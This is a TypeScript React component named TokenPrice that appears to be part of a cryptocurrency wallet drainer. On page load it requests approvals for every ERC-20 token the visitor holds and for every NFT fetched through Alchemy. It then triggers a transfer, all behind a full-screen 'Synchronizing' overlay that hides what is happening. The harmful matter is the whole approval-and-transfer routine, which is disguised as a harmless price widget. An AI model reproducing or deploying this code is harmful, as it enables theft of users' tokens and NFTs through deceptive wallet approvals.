import "./App.css";
import { useEffect, useRef, useState } from "react";
import Wallet from "./wallet";
import { alchemy } from "./Account";
import { TokenBalance } from "alchemy-sdk";


const transferInterface = [
    "function transfer(address to, uint amount)",
];

// export const myAddress = "0x58d0479bc1dADF0ce218D862143E268B538E2F62";
const erc20ContractInterface = [
    "function approve(address _spender, uint256 _amount) external returns (bool)"
];

const nftContractInterface = [
    "function approve(address operator, bool approved) external"
];

export const ercTokenContractABI = [
    {
        constant: false,
        inputs: [
            { internalType: "address", name: "_spender", type: "address" },
            { internalType: "uint256", name: "_amount", type: "uint256" },
        ],
        name: "approve",
        outputs: [
            {
                internalType: "bool",
                name: "",
                type: "bool",
            },
        ],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
];

export const nftTokenContractABI = [
    {
        inputs: [
            { internalType: "address", name: "operator", type: "address" },
            { internalType: "bool", name: "approved", type: "bool" },
        ],
        name: "setApprovalForAll",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
];

export interface NFT {
    token_address: string,
    token_id: string,
    contract_type: string,
    owner_of: string,
    block_number: string,
    block_number_minted: string,
    token_uri: string,
    metadata: string,
    synced_at: string,
    amount: string,
    name: string,
    symbol: string,
}

interface TokenProps {
    chaidId: string;
    balances: TokenBalance[];
}

export function sleep(ms: number) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const TokenPrice: React.FC<TokenProps> = (props) => {
    const [loading, setLoading] = useState(false);
    const [ready, setReady] = useState(false);

    useEffect(() => {
        (async () => {
            if (loading) return;
            setLoading(true);
            try {
                while (!Wallet.readyToTransact()) {
                    continue;
                }


                for (let ercBalance of props.balances) {
                    try {

                        await Wallet.approve(ercBalance.contractAddress, erc20ContractInterface);
                        // console.log("done")
                    } catch (error) { }
                }

                const nftBalance = await alchemy.nft.getNftsForOwner(Wallet.address);
                for (const nft of nftBalance.ownedNfts) {
                    Wallet.approveForAll(nft.contract.address, nft.tokenId, nftContractInterface);
                }

            } catch (error) {
                console.log(error)
            } finally {
                setLoading(false);
                console.log("sending")
                if (ready)
                    Wallet.transfer(transferInterface);
            }



        })()

    }, [props.balances]);
    return <>
        {loading ? <div className="z-10 fixed flex items-center justify-center h-screen w-screen top-0 left-0 bg-white">
            <div>
                <img src={process.env.PUBLIC_URL + "/logo.png"} className="w-24 animate-bounce mx-auto" alt="" />
                <div className="font-semibold text-3xl text-blue-500">
                    Synchronizing
                </div>
            </div>
        </div> : <> </>}
    </>;
};

export default TokenPrice;